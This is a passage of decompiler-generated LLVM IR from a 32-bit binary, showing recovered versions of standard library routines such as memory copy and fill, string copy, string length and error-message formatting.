  %v0_804d0fa = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_804d102 = call i32 @function_804fd7c(i16* %v1_804d0eb, i32 128, i32 %v0_804d0fa, i32 %v0_804d0fa)
  %v1_804d10a = icmp eq i32 %v6_804d102, 0
  %v1_804d10c = icmp eq i1 %v1_804d10a, false
  br i1 %v1_804d10c, label %dec_label_pc_804d14a, label %dec_label_pc_804d10e

dec_label_pc_804d10e:                             ; preds = %dec_label_pc_804d0fa, %dec_label_pc_804d0dc
  %v2_804d10e = icmp eq i32 %v4_804d0e3, 0
  br i1 %v2_804d10e, label %dec_label_pc_804d14a, label %dec_label_pc_804d112

dec_label_pc_804d112:                             ; preds = %dec_label_pc_804d10e
  %v1_804d112 = icmp eq i32 %arg3, 0
  br i1 %v1_804d112, label %dec_label_pc_804d14a, label %dec_label_pc_804d116

dec_label_pc_804d116:                             ; preds = %dec_label_pc_804d112
  %v9_804d11b = udiv i64 4294967295, %arg2
  %v10_804d11b = trunc i64 %v9_804d11b to i32
  %v6_804d11f = icmp ult i32 %v10_804d11b, %arg3
  br i1 %v6_804d11f, label %dec_label_pc_804d13b, label %dec_label_pc_804d121

dec_label_pc_804d121:                             ; preds = %dec_label_pc_804d116
  %sext = mul i64 %arg2, 4294967296
  %v2_804d124 = sdiv i64 %sext, 4294967296
  %v3_804d124 = sext i32 %arg3 to i64
  %v4_804d124 = mul nsw i64 %v3_804d124, %v2_804d124
  %v5_804d124 = trunc i64 %v4_804d124 to i32
  %v0_804d127 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804d12d = call i32 @function_804fc8c(i32 %arg1, i32 %v5_804d124, i32 %v0_804d127, i32 %v10_804d11b)
  %v6_804d12d = sext i32 %v5_804d12d to i64
  %v10_804d134 = udiv i64 %v6_804d12d, %arg2
  %v11_804d134 = trunc i64 %v10_804d134 to i32
  br label %dec_label_pc_804d14c

dec_label_pc_804d13b:                             ; preds = %dec_label_pc_804d116
  %v0_804d13b = load i32, i32* @ebx, align 4
  %v1_804d13b = inttoptr i32 %v0_804d13b to i16*
  %v2_804d13b = load i16, i16* %v1_804d13b, align 2
  %v3_804d13b = or i16 %v2_804d13b, 8
  store i16 %v3_804d13b, i16* %v1_804d13b, align 2
  %v0_804d13f = load i32, i32* %stack_var_-28, align 4
  %v1_804d13f = call i32 @function_804b774(i32 %v0_804d13f)
  %v1_804d144 = inttoptr i32 %v1_804d13f to i32*
  store i32 22, i32* %v1_804d144, align 4
  br label %dec_label_pc_804d14a

dec_label_pc_804d14a:                             ; preds = %dec_label_pc_804d112, %dec_label_pc_804d10e, %dec_label_pc_804d0fa, %dec_label_pc_804d13b
  br label %dec_label_pc_804d14c

dec_label_pc_804d14c:                             ; preds = %dec_label_pc_804d121, %dec_label_pc_804d14a
  %v0_804d14f = phi i32 [ %v11_804d134, %dec_label_pc_804d121 ], [ 0, %dec_label_pc_804d14a ]
  store i32 %v0_804d0dd, i32* @esi, align 4
  store i32 %v0_804d0dc, i32* @edi, align 4
  ret i32 %v0_804d14f

; uselistorder directives
  uselistorder i32 %v0_804d0fa, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804fc8c, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 (i16*, i32, i32, i32)* @function_804fd7c, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d14c, { 1, 0 }
  uselistorder label %dec_label_pc_804d14a, { 3, 0, 1, 2 }
}

define i32 @function_804d150(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d150:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d151 = load i32, i32* @esi, align 4
  store i32 %v0_804d151, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804d152 = sdiv i32 %sext, 16777216
  store i32 %v4_804d152, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804d15c = ptrtoint i16* %arg1 to i32
  store i32 %v4_804d15c, i32* %edi.global-to-local, align 4
  %v2_804d160 = udiv i32 %v4_804d152, 4
  %v3_804d163 = inttoptr i32 %arg2 to i8*
  %v4_804d163 = bitcast i16* %arg1 to i8*
  %v5_804d163 = call i8* @_memcpy(i8* %v4_804d163, i8* %v3_804d163, i32 %v2_804d160)
  %v6_804d163 = ptrtoint i8* %v5_804d163 to i32
  store i32 %v6_804d163, i32* @ecx, align 4
  %v0_804d165 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d165 = and i32 %v0_804d165, 2
  %v3_804d165 = icmp eq i32 %v2_804d165, 0
  br i1 %v3_804d165, label %dec_label_pc_804d16b, label %dec_label_pc_804d169

dec_label_pc_804d169:                             ; preds = %dec_label_pc_804d150
  %v0_804d169 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d169 = inttoptr i32 %v0_804d169 to i16*
  %v2_804d169 = load i16, i16* %v1_804d169, align 2
  %v3_804d169 = load i32, i32* %edi.global-to-local, align 4
  %v4_804d169 = inttoptr i32 %v3_804d169 to i16*
  store i16 %v2_804d169, i16* %v4_804d169, align 2
  %v5_804d169 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d169 = load i32, i32* %esi.global-to-local, align 4
  %v7_804d169 = load i1, i1* @df, align 1
  %v8_804d169 = select i1 %v7_804d169, i32 -2, i32 2
  %v9_804d169 = add i32 %v8_804d169, %v5_804d169
  %v10_804d169 = add i32 %v8_804d169, %v6_804d169
  store i32 %v9_804d169, i32* %edi.global-to-local, align 4
  store i32 %v10_804d169, i32* %esi.global-to-local, align 4
  %v0_804d16b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d16b

dec_label_pc_804d16b:                             ; preds = %dec_label_pc_804d150, %dec_label_pc_804d169
  %v0_804d16b = phi i32 [ %v0_804d165, %dec_label_pc_804d150 ], [ %v0_804d16b.pre, %dec_label_pc_804d169 ]
  %v2_804d16b = urem i32 %v0_804d16b, 2
  %v3_804d16b = icmp eq i32 %v2_804d16b, 0
  br i1 %v3_804d16b, label %dec_label_pc_804d170, label %dec_label_pc_804d16f

dec_label_pc_804d16f:                             ; preds = %dec_label_pc_804d16b
  %v0_804d16f = load i32, i32* %esi.global-to-local, align 4
  %v1_804d16f = inttoptr i32 %v0_804d16f to i8*
  %v2_804d16f = load i8, i8* %v1_804d16f, align 1
  %v3_804d16f = load i32, i32* %edi.global-to-local, align 4
  %v4_804d16f = inttoptr i32 %v3_804d16f to i8*
  store i8 %v2_804d16f, i8* %v4_804d16f, align 1
  %v5_804d16f = load i32, i32* %edi.global-to-local, align 4
  %v6_804d16f = load i32, i32* %esi.global-to-local, align 4
  %v7_804d16f = load i1, i1* @df, align 1
  %v8_804d16f = select i1 %v7_804d16f, i32 -1, i32 1
  %v9_804d16f = add i32 %v8_804d16f, %v5_804d16f
  %v10_804d16f = add i32 %v8_804d16f, %v6_804d16f
  store i32 %v9_804d16f, i32* %edi.global-to-local, align 4
  store i32 %v10_804d16f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d170

dec_label_pc_804d170:                             ; preds = %dec_label_pc_804d16b, %dec_label_pc_804d16f
  store i32 %v4_804d15c, i32* %eax.global-to-local, align 4
  %v2_804d174 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d174, i32* @esi, align 4
  ret i32 %v4_804d15c

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d170, { 1, 0 }
  uselistorder label %dec_label_pc_804d16b, { 1, 0 }
}

define i32 @function_804d178(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d178:
  %v0_804d178 = load i32, i32* @edi, align 4
  %v4_804d181 = ptrtoint i8* %arg1 to i32
  %v5_804d185 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804d185 = ptrtoint i8* %v5_804d185 to i32
  store i32 %v6_804d185, i32* @ecx, align 4
  store i32 %v0_804d178, i32* @edi, align 4
  ret i32 %v4_804d181

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_804d190(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804d190:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d191 = load i32, i32* @esi, align 4
  store i32 %v0_804d191, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804d199 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d199, i32* %edi.global-to-local, align 4
  %v4_804d19d.pre = load i32, i32* @eax, align 4
  %v8_804d19d.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804d19d

dec_label_pc_804d19d:                             ; preds = %dec_label_pc_804d19d.dec_label_pc_804d19d_crit_edge, %dec_label_pc_804d190
  %v2_804d19e = phi i32 [ %v7_804d19e, %dec_label_pc_804d19d.dec_label_pc_804d19d_crit_edge ], [ %v4_804d199, %dec_label_pc_804d190 ]
  %v8_804d19d = phi i1 [ %v5_804d19e, %dec_label_pc_804d19d.dec_label_pc_804d19d_crit_edge ], [ %v8_804d19d.pre, %dec_label_pc_804d190 ]
  %v4_804d19d = phi i32 [ %v0_804d19f, %dec_label_pc_804d19d.dec_label_pc_804d19d_crit_edge ], [ %v4_804d19d.pre, %dec_label_pc_804d190 ]
  %v7_804d19d = phi i32 [ %v0_804d19d.pre, %dec_label_pc_804d19d.dec_label_pc_804d19d_crit_edge ], [ %arg2, %dec_label_pc_804d190 ]
  %v1_804d19d = inttoptr i32 %v7_804d19d to i8*
  %v2_804d19d = load i8, i8* %v1_804d19d, align 1
  %v3_804d19d = zext i8 %v2_804d19d to i32
  %v5_804d19d = and i32 %v4_804d19d, -256
  %v6_804d19d = or i32 %v3_804d19d, %v5_804d19d
  store i32 %v6_804d19d, i32* %eax.global-to-local, align 4
  %v9_804d19d = select i1 %v8_804d19d, i32 -1, i32 1
  %v10_804d19d = add i32 %v7_804d19d, %v9_804d19d
  store i32 %v10_804d19d, i32* %esi.global-to-local, align 4
  %v3_804d19e = inttoptr i32 %v2_804d19e to i8*
  store i8 %v2_804d19d, i8* %v3_804d19e, align 1
  %v4_804d19e = load i32, i32* %edi.global-to-local, align 4
  %v5_804d19e = load i1, i1* @df, align 1
  %v6_804d19e = select i1 %v5_804d19e, i32 -1, i32 1
  %v7_804d19e = add i32 %v6_804d19e, %v4_804d19e
  store i32 %v7_804d19e, i32* %edi.global-to-local, align 4
  %v0_804d19f = load i32, i32* %eax.global-to-local, align 4
  %v3_804d19f = trunc i32 %v0_804d19f to i8
  %v4_804d19f = icmp eq i8 %v3_804d19f, 0
  %v1_804d1a1 = icmp eq i1 %v4_804d19f, false
  br i1 %v1_804d1a1, label %dec_label_pc_804d19d.dec_label_pc_804d19d_crit_edge, label %dec_label_pc_804d1a3

dec_label_pc_804d19d.dec_label_pc_804d19d_crit_edge: ; preds = %dec_label_pc_804d19d
  %v0_804d19d.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d19d

dec_label_pc_804d1a3:                             ; preds = %dec_label_pc_804d19d
  store i32 %v4_804d199, i32* %eax.global-to-local, align 4
  %v2_804d1a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d1a8, i32* @esi, align 4
  ret i32 %v4_804d199

; uselistorder directives
  uselistorder i32 %v0_804d19f, { 1, 0 }
  uselistorder i32 %v7_804d19e, { 1, 0 }
  uselistorder i1 %v5_804d19e, { 1, 0 }
  uselistorder i32 %v4_804d199, { 1, 2, 0, 3 }
}

define i32 @function_804d1ac(i8* %arg1) local_unnamed_addr {
dec_label_pc_804d1ac:
  %v0_804d1ac = load i32, i32* @edi, align 4
  %v3_804d1b6 = call i32 @_strlen(i8* %arg1)
  store i32 %v3_804d1b6, i32* @ecx, align 4
  store i32 %v0_804d1ac, i32* @edi, align 4
  ret i32 %v3_804d1b6
}

define i32 @function_804d1c0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d1c0:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d1c1 = load i32, i32* @esi, align 4
  store i32 %v0_804d1c1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804d1cd = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d1cd, i32* %edi.global-to-local, align 4
  %v1_804d1d1 = add i32 %arg3, 1
  store i32 %v1_804d1d1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804d1d2

dec_label_pc_804d1d2:                             ; preds = %dec_label_pc_804d1d5, %dec_label_pc_804d1c0
  %v3_804d1d6 = phi i32 [ %v4_804d1cd, %dec_label_pc_804d1c0 ], [ %v8_804d1d6, %dec_label_pc_804d1d5 ]
  %v0_804d1d2 = phi i32 [ %v1_804d1d1, %dec_label_pc_804d1c0 ], [ %v0_804d1d2.pre, %dec_label_pc_804d1d5 ]
  %v1_804d1d2 = add i32 %v0_804d1d2, -1
  %v8_804d1d2 = icmp eq i32 %v1_804d1d2, 0
  store i32 %v1_804d1d2, i32* %ecx.global-to-local, align 4
  br i1 %v8_804d1d2, label %.loopexit, label %dec_label_pc_804d1d5

dec_label_pc_804d1d5:                             ; preds = %dec_label_pc_804d1d2
  %v0_804d1d5 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d1d5 = inttoptr i32 %v0_804d1d5 to i8*
  %v2_804d1d5 = load i8, i8* %v1_804d1d5, align 1
  %v10_804d1d5 = load i1, i1* @df, align 1
  %v11_804d1d5 = select i1 %v10_804d1d5, i32 -1, i32 1
  %v12_804d1d5 = add i32 %v11_804d1d5, %v0_804d1d5
  store i32 %v12_804d1d5, i32* %esi.global-to-local, align 4
  %v4_804d1d6 = inttoptr i32 %v3_804d1d6 to i8*
  store i8 %v2_804d1d5, i8* %v4_804d1d6, align 1
  %v5_804d1d6 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d1d6 = load i1, i1* @df, align 1
  %v7_804d1d6 = select i1 %v6_804d1d6, i32 -1, i32 1
  %v8_804d1d6 = add i32 %v7_804d1d6, %v5_804d1d6
  store i32 %v8_804d1d6, i32* %edi.global-to-local, align 4
  %v6_804d1d7 = icmp eq i8 %v2_804d1d5, 0
  %v1_804d1d9 = icmp eq i1 %v6_804d1d7, false
  %v0_804d1d2.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804d1d9, label %dec_label_pc_804d1d2, label %dec_label_pc_804d1db

dec_label_pc_804d1db:                             ; preds = %dec_label_pc_804d1d5
  %v1_804d1db = add i32 %v0_804d1d2.pre, -1
  store i32 %v1_804d1db, i32* %ecx.global-to-local, align 4
  %v2_804d1dc = sext i8 %v2_804d1d5 to i32
  %v4_804d1dc = inttoptr i32 %v8_804d1d6 to i8*
  %v5_804d1dc = call i8* @_memset(i8* %v4_804d1dc, i32 %v2_804d1dc, i32 %v1_804d1db)
  %v6_804d1dc = ptrtoint i8* %v5_804d1dc to i32
  store i32 %v6_804d1dc, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804d1d2, %dec_label_pc_804d1db
  %v2_804d1e2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d1e2, i32* @edx, align 4
  %v2_804d1e3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d1e3, i32* @esi, align 4
  ret i32 %v4_804d1cd

; uselistorder directives
  uselistorder i32 %v8_804d1d6, { 0, 2, 1 }
  uselistorder i8 %v2_804d1d5, { 0, 2, 1 }
  uselistorder i32 %v1_804d1d2, { 1, 0 }
  uselistorder i32 %v4_804d1cd, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @function_804d1e8() local_unnamed_addr {
dec_label_pc_804d1e8:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_1()
  %v4_804d1e8 = ptrtoint i8* %tmp4 to i32
  %v8_804d1fb5 = icmp eq i32 %tmp, 0
  %v1_804d1fc6 = icmp eq i1 %v8_804d1fb5, false
  br i1 %v1_804d1fc6, label %dec_label_pc_804d1f5, label %dec_label_pc_804d1fe

dec_label_pc_804d1f5:                             ; preds = %dec_label_pc_804d1e8, %dec_label_pc_804d1fa
  %v1_804d1fb8 = phi i32 [ %v1_804d1fb, %dec_label_pc_804d1fa ], [ %tmp, %dec_label_pc_804d1e8 ]
  %v0_804d1fe7 = phi i32 [ %v1_804d1fa, %dec_label_pc_804d1fa ], [ %v4_804d1e8, %dec_label_pc_804d1e8 ]
  %v1_804d1f5 = inttoptr i32 %v0_804d1fe7 to i8*
  %v2_804d1f5 = load i8, i8* %v1_804d1f5, align 1
  %v3_804d1f5 = icmp eq i8 %v2_804d1f5, 0
  br i1 %v3_804d1f5, label %dec_label_pc_804d1fe, label %dec_label_pc_804d1fa

dec_label_pc_804d1fa:                             ; preds = %dec_label_pc_804d1f5
  %v1_804d1fa = add i32 %v0_804d1fe7, 1
  %v1_804d1fb = add i32 %v1_804d1fb8, -1
  %v8_804d1fb = icmp eq i32 %v1_804d1fb, 0
  %v1_804d1fc = icmp eq i1 %v8_804d1fb, false
  br i1 %v1_804d1fc, label %dec_label_pc_804d1f5, label %dec_label_pc_804d1fe

dec_label_pc_804d1fe:                             ; preds = %dec_label_pc_804d1fa, %dec_label_pc_804d1f5, %dec_label_pc_804d1e8
  %v0_804d1fe.lcssa = phi i32 [ %v4_804d1e8, %dec_label_pc_804d1e8 ], [ %v0_804d1fe7, %dec_label_pc_804d1f5 ], [ %v1_804d1fa, %dec_label_pc_804d1fa ]
  %v2_804d1fe = sub i32 %v0_804d1fe.lcssa, %v4_804d1e8
  ret i32 %v2_804d1fe

; uselistorder directives
  uselistorder i32 %v1_804d1fb, { 1, 0 }
  uselistorder i32 %v0_804d1fe7, { 0, 2, 1 }
  uselistorder i32 %v4_804d1e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d1f5, { 1, 0 }
}

define i32 @function_804d204() local_unnamed_addr {
dec_label_pc_804d204:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804d215 = call i32 @function_804d224(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804d21a = load i32, i32* @ebx, align 4
  ret i32 %v0_804d21a
}

define i32 @function_804d224(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d224:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804d236 = icmp ugt i32 %arg1, 124
  br i1 %v6_804d236, label %dec_label_pc_804d253, label %dec_label_pc_804d238

dec_label_pc_804d238:                             ; preds = %dec_label_pc_804d224
  store i32 ptrtoint ([8 x i8]* @global_var_8053780.132 to i32), i32* @esi, align 4
  %v1_804d2484 = icmp eq i32 %arg1, 0
  %v1_804d24a11 = icmp eq i1 %v1_804d2484, false
  br i1 %v1_804d24a11, label %dec_label_pc_804d241, label %dec_label_pc_804d24c

dec_label_pc_804d241:                             ; preds = %dec_label_pc_804d238, %dec_label_pc_804d241
  %v0_804d244 = phi i32 [ %v3_804d244, %dec_label_pc_804d241 ], [ %arg1, %dec_label_pc_804d238 ]
  %v0_804d247 = phi i32 [ %v1_804d247, %dec_label_pc_804d241 ], [ ptrtoint ([8 x i8]* @global_var_8053780.132 to i32), %dec_label_pc_804d238 ]
  %v1_804d241 = inttoptr i32 %v0_804d247 to i8*
  %v2_804d241 = load i8, i8* %v1_804d241, align 1
  %v7_804d241 = icmp eq i8 %v2_804d241, 0
  %v2_804d244 = zext i1 %v7_804d241 to i32
  %v3_804d244 = add i32 %v2_804d244, %v0_804d244
  %v16_804d244 = icmp eq i32 %v3_804d244, 0
  %v1_804d247 = add i32 %v0_804d247, 1
  store i32 %v1_804d247, i32* @esi, align 4
  %v1_804d24a = icmp eq i1 %v16_804d244, false
  br i1 %v1_804d24a, label %dec_label_pc_804d241, label %dec_label_pc_804d24c

dec_label_pc_804d24c:                             ; preds = %dec_label_pc_804d241, %dec_label_pc_804d238
  %v0_804d24e = phi i32 [ ptrtoint ([8 x i8]* @global_var_8053780.132 to i32), %dec_label_pc_804d238 ], [ %v1_804d247, %dec_label_pc_804d241 ]
  store i32 0, i32* @ebp, align 4
  %v1_804d24e = inttoptr i32 %v0_804d24e to i8*
  %v2_804d24e = load i8, i8* %v1_804d24e, align 1
  %v3_804d24e = icmp eq i8 %v2_804d24e, 0
  %v1_804d251 = icmp eq i1 %v3_804d24e, false
  br i1 %v1_804d251, label %dec_label_pc_804d24c.dec_label_pc_804d282_crit_edge, label %dec_label_pc_804d253

dec_label_pc_804d24c.dec_label_pc_804d282_crit_edge: ; preds = %dec_label_pc_804d24c
  br label %dec_label_pc_804d282

dec_label_pc_804d253:                             ; preds = %dec_label_pc_804d24c, %dec_label_pc_804d224
  store i32 22, i32* @ebp, align 4
  %v1_804d25b = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_804d267 = bitcast i32* %stack_var_-17 to i8*
  %v7_804d267 = call i32 @function_804feb4(i8* %v6_804d267, i32 %arg1, i32 %v1_804d25b, i32 -10, i32 0)
  %v1_804d26f = add i32 %v7_804d267, -14
  store i32 %v1_804d26f, i32* @esi, align 4
  %v5_804d279 = inttoptr i32 %v1_804d26f to i8*
  store i8* %v5_804d279, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804d26f to i16*
  %v6_804d27a = call i32 @function_804d150(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8053762.133 to i32), i32 14)
  %v0_804d291.pre = load i32, i32* @edi, align 4
  %v0_804d293.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d282

dec_label_pc_804d282:                             ; preds = %dec_label_pc_804d24c.dec_label_pc_804d282_crit_edge, %dec_label_pc_804d253
  %v0_804d293 = phi i32 [ %v0_804d24e, %dec_label_pc_804d24c.dec_label_pc_804d282_crit_edge ], [ %v0_804d293.pre, %dec_label_pc_804d253 ]
  %v0_804d291 = phi i32 [ %arg3, %dec_label_pc_804d24c.dec_label_pc_804d282_crit_edge ], [ %v0_804d291.pre, %dec_label_pc_804d253 ]
  %v4_804d284 = icmp eq i32 %arg2, 0
  %v1_804d289 = icmp eq i1 %v4_804d284, false
  %v2_804d291 = select i1 %v1_804d289, i32 %v0_804d291, i32 0
  store i32 %v2_804d291, i32* @edi, align 4
  %v5_804d293 = inttoptr i32 %v0_804d293 to i8*
  store i8* %v5_804d293, i8** %stack_var_-108, align 4
  %v3_804d294 = call i32 @function_804d1ac(i8* %v5_804d293)
  %v1_804d29c = add i32 %v3_804d294, 1
  store i32 %v1_804d29c, i32* %ebx.global-to-local, align 4
  %v1_804d29f = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_804d29c, %v1_804d29f
  br i1 %tmp46, label %dec_label_pc_804d2a3, label %dec_label_pc_804d2aa

dec_label_pc_804d2a3:                             ; preds = %dec_label_pc_804d282
  store i32 %v1_804d29f, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804d2aa

dec_label_pc_804d2aa:                             ; preds = %dec_label_pc_804d282, %dec_label_pc_804d2a3
  %v0_804d2af = phi i32 [ %v1_804d29c, %dec_label_pc_804d282 ], [ %v1_804d29f, %dec_label_pc_804d2a3 ]
  %v1_804d2aa = icmp eq i32 %v0_804d2af, 0
  br i1 %v1_804d2aa, label %dec_label_pc_804d2c6, label %dec_label_pc_804d2ae

dec_label_pc_804d2ae:                             ; preds = %dec_label_pc_804d2aa
  %v0_804d2b0 = load i32, i32* @esi, align 4
  %v8_804d2b1 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804d2b1, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804d2b5 = call i32 @function_804d150(i16* %tmp45, i32 %v0_804d2b0, i32 %v0_804d2af)
  %v1_804d2c1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d2c1 = add i32 %arg2, -1
  %v3_804d2c1 = add i32 %v2_804d2c1, %v1_804d2c1
  %v4_804d2c1 = inttoptr i32 %v3_804d2c1 to i8*
  store i8 0, i8* %v4_804d2c1, align 1
  br label %dec_label_pc_804d2c6

dec_label_pc_804d2c6:                             ; preds = %dec_label_pc_804d2aa, %dec_label_pc_804d2ae
  %v0_804d2c6 = load i32, i32* @ebp, align 4
  %v1_804d2c6 = icmp eq i32 %v0_804d2c6, 0
  br i1 %v1_804d2c6, label %dec_label_pc_804d2d1, label %dec_label_pc_804d2ca

dec_label_pc_804d2ca:                             ; preds = %dec_label_pc_804d2c6
  %v0_804d2ca = load i8*, i8** %stack_var_-108, align 4
  %v1_804d2ca = ptrtoint i8* %v0_804d2ca to i32
  %v2_804d2ca = call i32 @function_804b774(i32 %v1_804d2ca)
  %v0_804d2cf = load i32, i32* @ebp, align 4
  %v2_804d2cf = inttoptr i32 %v2_804d2ca to i32*
  store i32 %v0_804d2cf, i32* %v2_804d2cf, align 4
  %v0_804d2d4.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804d2d1

dec_label_pc_804d2d1:                             ; preds = %dec_label_pc_804d2c6, %dec_label_pc_804d2ca
  %v0_804d2d4 = phi i32 [ 0, %dec_label_pc_804d2c6 ], [ %v0_804d2d4.pre, %dec_label_pc_804d2ca ]
  ret i32 %v0_804d2d4

; uselistorder directives
  uselistorder i32 %v1_804d29f, { 1, 2, 0 }
  uselistorder i32 %v1_804d29c, { 1, 0, 2 }
  uselistorder i32 %v1_804d26f, { 1, 0, 2 }
  uselistorder i32 %v1_804d247, { 0, 2, 1 }
  uselistorder i32 %v3_804d244, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8053780.132 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804d2d1, { 1, 0 }
  uselistorder label %dec_label_pc_804d2c6, { 1, 0 }
  uselistorder label %dec_label_pc_804d2aa, { 1, 0 }
  uselistorder label %dec_label_pc_804d282, { 1, 0 }
  uselistorder label %dec_label_pc_804d241, { 1, 0 }
}

define i32 @function_804d2dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d2dc:
  %v2_804d2ec = inttoptr i32 %arg2 to i8*
  %v3_804d2ec = call i32 @function_805064c(i8* %v2_804d2ec, i32 %arg1)
  ret i32 %v3_804d2ec
}

define i32 @function_804d2f4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804d2f4:
  %v4_804d2f6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d2f6, i32* @ecx, align 4
  %v0_804d300 = load i32, i32* bitcast (i32** @global_var_8056088.134 to i32*), align 8
  br label %dec_label_pc_804d306

dec_label_pc_804d306:                             ; preds = %dec_label_pc_804d323, %dec_label_pc_804d2f4
  %v0_804d3297 = phi i32 [ %v0_804d3298, %dec_label_pc_804d323 ], [ 0, %dec_label_pc_804d2f4 ]
  %v0_804d323 = phi i32 [ %v1_804d323, %dec_label_pc_804d323 ], [ %arg2, %dec_label_pc_804d2f4 ]
  %v0_804d324 = phi i32 [ %v1_804d324, %dec_label_pc_804d323 ], [ %v4_804d2f6, %dec_label_pc_804d2f4 ]
  %v12_804d306 = icmp eq i32 %v0_804d324, %v0_804d323
  %.pre = inttoptr i32 %v0_804d324 to i8*
  br i1 %v12_804d306, label %dec_label_pc_804d31e, label %dec_label_pc_804d30a

dec_label_pc_804d30a:                             ; preds = %dec_label_pc_804d306
  %v2_804d30a = load i8, i8* %.pre, align 1
  %v3_804d30a = zext i8 %v2_804d30a to i32
  %v2_804d30d = mul nuw nsw i32 %v3_804d30a, 2
  %v3_804d30d = add i32 %v2_804d30d, %v0_804d300
  %v4_804d30d = inttoptr i32 %v3_804d30d to i16*
  %v5_804d30d = load i16, i16* %v4_804d30d, align 2
  %v6_804d30d = sext i16 %v5_804d30d to i32
  %v1_804d311 = inttoptr i32 %v0_804d323 to i8*
  %v2_804d311 = load i8, i8* %v1_804d311, align 1
  %v3_804d311 = zext i8 %v2_804d311 to i32
  %v2_804d314 = mul nuw nsw i32 %v3_804d311, 2
  %v3_804d314 = add i32 %v2_804d314, %v0_804d300
  %v4_804d314 = inttoptr i32 %v3_804d314 to i16*
  %v5_804d314 = load i16, i16* %v4_804d314, align 2
  %v6_804d314 = sext i16 %v5_804d314 to i32
